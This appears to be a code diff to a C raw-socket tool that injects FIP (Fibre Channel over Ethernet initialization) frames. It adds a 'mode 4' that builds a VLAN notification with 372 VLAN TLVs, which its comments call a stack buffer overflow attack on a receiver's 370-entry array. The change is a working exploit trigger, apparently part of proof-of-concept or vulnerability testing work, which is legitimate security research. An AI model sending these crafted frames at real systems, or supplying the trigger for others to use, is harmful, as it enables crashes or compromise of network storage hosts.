@@ -6,6 +6,7 @@
  *   mode 1: send valid FIP VLAN notification
  *   mode 2: send FIP VLAN notification with zero-length TLV after valid TLVs
  *   mode 3: send FIP VLAN request (triggers VN2VN responder path)
+ *   mode 4: send FIP VLAN notification with 372 VLAN TLVs (stack overflow)
  *
  *   dest_ifname: optional receiving interface whose MAC is used as
  *                the Ethernet destination. Required when injecting
@@ -92,8 +93,8 @@ static int send_fip_frame(const char *ifname, int mode,
     unsigned char src_mac[6];
     struct sockaddr_ll sa;
 
-    unsigned char frame[256];
-    int frame_len = 0;
+    unsigned char *frame;
+    int frame_size, frame_len = 0;
 
     struct ethhdr *eth;
     struct fiphdr *fh;
@@ -117,7 +118,14 @@ static int send_fip_frame(const char *ifname, int mode,
         return 1;
     }
 
-    memset(frame, 0, sizeof(frame));
+    frame_size = (mode == 4) ? 2048 : 256;
+    frame = malloc(frame_size);
+    if (!frame) {
+        perror("malloc");
+        close(fd);
+        return 1;
+    }
+    memset(frame, 0, frame_size);
 
     /* Ethernet header */
     eth = (struct ethhdr *)frame;
@@ -207,9 +215,28 @@ static int send_fip_frame(const char *ifname, int mode,
         fh->fip_desc_len = htons(desc_len_bytes >> 2);
         frame_len += desc_len_bytes;
 
+    } else if (mode == 4) {
+        /*
+         * Mode 4: Stack buffer overflow attack
+         * 372 VLAN TLVs (no MAC TLV needed) to overflow the 370-entry array.
+         * FIP payload = 10 (header) + 372*4 (TLVs) = 1498, fits in 1500 MTU.
+         */
+        struct fip_tlv_vlan *vlan_tlv = (struct fip_tlv_vlan *)tlv_start;
+        for (int i = 0; i < 372; i++) {
+            vlan_tlv->hdr.tlv_type = FIP_TLV_VLAN;
+            vlan_tlv->hdr.tlv_len = 1;
+            vlan_tlv->vlan = htons(100 + i);
+            desc_len_bytes += 4;
+            vlan_tlv = (struct fip_tlv_vlan *)((unsigned char *)vlan_tlv + 4);
+        }
+
+        fh->fip_desc_len = htons(desc_len_bytes >> 2);
+        frame_len += desc_len_bytes;
+
     } else {
         fprintf(stderr, "Unknown mode %d\n", mode);
         close(fd);
+        free(frame);
         return 1;
     }
 
@@ -225,12 +252,14 @@ static int send_fip_frame(const char *ifname, int mode,
     if (rc < 0) {
         perror("sendto");
         close(fd);
+        free(frame);
         return 1;
     }
 
     printf("Sent %d-byte FIP frame (mode %d) on %s (ifindex %u)\n",
            rc, mode, ifname, ifindex);
     close(fd);
+    free(frame);
     return 0;
 }
 
@@ -245,6 +274,7 @@ int main(int argc, char **argv)
         fprintf(stderr, "  mode 1: valid FIP VLAN notification\n");
         fprintf(stderr, "  mode 2: valid MAC TLV + zero-length VLAN TLV\n");
         fprintf(stderr, "  mode 3: FIP VLAN request (VN2VN responder trigger)\n");
+        fprintf(stderr, "  mode 4: 372 VLAN TLVs (stack buffer overflow attack)\n");
         fprintf(stderr, "  dest_ifname: receiver interface (use its MAC as dest)\n");
         return 1;
     }
